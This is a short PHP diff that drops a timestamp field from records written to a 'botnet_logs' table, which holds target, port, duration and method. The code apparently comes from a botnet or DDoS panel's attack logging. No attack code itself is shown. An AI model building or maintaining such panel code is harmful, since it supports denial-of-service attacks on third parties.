@@ -73,8 +73,7 @@
                     'target' => $target,
                     'port' => $port,
                     'time' => $time,
-                    'method' => $method,
-                    'date' => time()
+                    'method' => $method
                 ];
                 addNewRecord($conn, 'botnet_logs', $logsData);
 
